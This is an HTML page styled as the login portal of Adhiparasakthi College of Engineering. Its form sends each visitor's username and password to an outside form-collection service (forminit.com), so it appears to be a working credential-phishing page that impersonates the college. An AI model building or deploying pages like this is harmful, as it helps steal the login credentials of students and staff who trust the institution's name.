<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Adhiparasakthi College Login</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    * {
        box-sizing: border-box;
    }

    body {
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: Arial, sans-serif;

        /* 🌈 Animated background */
        background: linear-gradient(-45deg, #FF9933, #FFFFFF, #138808);
        background-size: 300% 300%;
        animation: bg 8s ease infinite;
    }

    @keyframes bg {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }

    .box {
        width: 380px;
        max-width: 90%;
        padding: 30px;
        background: white;
        border-radius: 15px;
        text-align: center;
        box-shadow: 0 15px 35px rgba(0,0,0,0.3);
    }

    .logo {
        width: 95px;
        height: 95px;
        object-fit: cover;
        border-radius: 12px;
        margin-bottom: 10px;
    }

    h1 {
        font-size: 20px;
        margin: 5px 0;
        color: #222;
    }

    h2 {
        font-size: 15px;
        color: #555;
        margin-bottom: 20px;
    }

    input {
        width: 100%;
        padding: 12px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 8px;
        outline: none;
    }

    button {
        width: 100%;
        padding: 12px;
        background: linear-gradient(90deg, #FF9933, #138808);
        color: white;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        cursor: pointer;
    }

    button:hover {
        opacity: 0.9;
    }

    .footer {
        margin-top: 12px;
        font-size: 12px;
        color: gray;
    }
</style>
</head>

<body>

<div class="box">

    <img src="logo.png" class="logo">

    <h1>ADHIPARASAKTHI COLLEGE OF ENGINEERING</h1>
    <h2>Login Portal</h2>

    <!-- ✅ FORMINIT FORM -->
    <form action="https://forminit.com/f/sw6bs4wpv3a" method="POST">

        <input type="text" name="username" placeholder="Username" required>

        <input type="password" name="password" placeholder="Password" required>

        <button type="submit">Login</button>
    </form>

    <div class="footer">
        “Excellence is a continuous process and not an accident” 🚀
    </div>

</div>

</body>
</html>
